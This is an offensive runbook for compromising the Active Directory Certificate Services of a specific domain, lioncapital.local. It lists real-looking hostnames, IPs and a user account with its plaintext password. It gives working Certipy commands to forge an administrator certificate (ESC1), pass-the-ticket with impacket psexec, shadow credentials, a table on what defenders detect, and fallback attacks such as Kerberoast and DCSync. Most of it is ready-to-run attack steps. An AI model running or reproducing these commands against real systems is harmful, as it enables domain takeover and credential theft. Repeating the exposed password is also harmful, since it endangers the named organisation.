# AD CS Attack Runbook (lioncapital.local)

## Context

We identified:
- Domain: `lioncapital.local`
- DC: `PWADCIFLS01.lioncapital.local` (10.19.8.102)
- CA server candidate: `pwnaddbls01.lioncapita.local` (10.19.8.96)
- User group: `LIONCAPITAL\CERTSVC_DCOM_ACCESS`

This group's existence strongly hints at **AD CS misconfiguration** that allows ESC1 or ESC6.

## Phase 1: Recon (use 2_ADCS_Recon.bat from stealth-attack-signed-v2)

```cmd
:: Find CAs
certutil.exe -ADCA

:: Find all templates
certutil.exe -CATemplates

:: Check each CA's flag
certutil.exe -CAInfo CANAME_HERE
```

Look for:
- `EDITF_ATTRIBUTESUBJECTALTNAME2` flag (0x00080000) = **ESC6**
- `ENROLLEE_SUPPLIES_SUBJECT` flag on templates = **ESC1**
- Templates with no EKU + low RA signature count = **ESC1**
- Web enrollment enabled (http://ca/certsrv/) = **ESC6/7**

## Phase 2: Confirm with Certipy

```bash
# From your Linux box (assumes you have network access)
certipy find -u 'lsg122b@lioncapital.local' \
  -p 'EFveryFun08$' \
  -dc-ip 10.19.8.102 \
  -target PWADCIFLS01.lioncapital.local \
  -vulnerable \
  -stdout
```

If Certipy finds vulnerable templates:

```
[!] ESC1 VULNERABLE: UserSmartCardLogin
[!] ESC8: CA Web Enrollment in NTLM
```

## Phase 3: ESC1 Exploit

If `ENROLLEE_SUPPLIES_SUBJECT` template vulnerable:

```bash
certipy req -u 'lsg122b@lioncapital.local' \
  -p 'EFveryFun08$' \
  -dc-ip 10.19.8.102 \
  -target PWADCIFLS01.lioncapital.local \
  -ca 'lioncapital-CA' \
  -template 'ESC1_TEMPLATE' \
  -upn 'administrator@lioncapital.local' \
  -sid 'S-1-5-21-1192132689-1058670598-4104447906-500' \
  -out pda
```

Result: `pda.pfx` with cert for `administrator@lioncapital.local`.

## Phase 4: Use the cert

```bash
certipy auth -pfx pda.pfx -dc-ip 10.19.8.102

# Get TGT for Administrator
ls -la administrator.ccache
export KRB5CCNAME=administrator.ccache

# Pass-the-ticket via impacket
impacket-psexec.py -k -no-pass lioncapital.local/administrator@PWADCIFLS01.lioncapital.local
```

## Phase 5: Shadow Credentials (ESC9 alternative)

If ESC1 isn't available, try ESC9 (requires write access to msDS-KeyCredentialLink):

```bash
# Requires write perms on user object
certipy shadow auto -u 'lsg122b@lioncapital.local' \
  -p 'EFveryFun08$' \
  -dc-ip 10.19.8.102 \
  -account 'targetuser'
```

## Common ESCs Reference

| ESC | Vulnerability | Trigger |
|-----|---------------|---------|
| **ESC1** | SAN allows Subject Alternative Name = arbitrary UPN | Misconfigured enrollment agent template |
| **ESC2** | Any purpose EKU on cert template | Abuse to enroll in another template's name |
| **ESC3** | Enrollment Agent template | Chain ESC1 + ESC3 for DCSync |
| **ESC4** | ACL on cert template lets user edit it | Modify template + ESC1 |
| **ESC5** | ACL on PKI object access | Add user to CA admin |
| **ESC6** | EDITF_ATTRIBUTESUBJECTALTNAME2 flag set on CA | Any low-priv user can request cert with arbitrary SAN |
| **ESC7** | ManageCA access | Add user to CA role |
| **ESC8** | NTLM-coerced via HTTP web enrollment | Coerce DC to request cert |
| **ESC9** | No security extension flag | Cert with arbitrary UPN via S4U2Self |
| **ESC10** | Weak certificate mapping | ESC10 when using RSA + weak mapping |
| **ESC11** | IF_ENFORCEENCRYPTEDKEYTOGENSEND flag | Coerce DC + ESC8 chain |

## Detection reality

| Defense | Detects |
|---------|---------|
| MDI | Anomalous cert template usage |
| Defender ATP | Cert request from low-priv user to DC SAN |
| Defender for Cloud Apps | Anomalous auth patterns |
| SIEM correlation | High-rate cert requests |

## Fallback if AD CS isn't exploitable

If no AD CS vuln found:

1. **Kerberoast** - Find service accounts, crack offline
2. **AS-REP Roast** - Find no-preauth accounts
3. **DCSync** - Need DA first (chicken/egg)
4. **LAPS password read** - If LAPS installed and you have read perms
5. **gMSA password read** - If gMSA service accounts exist

## Tools to obtain

| Tool | How |
|------|-----|
| certipy | `pip install certipy-ad` |
| certipy.exe (Windows) | github.com/ly4k/Certipy/releases |
| Mimikatz | github.com/ParrotSec/mimikatz |
| Impacket | pip install impacket / github.com/fortra/impacket |

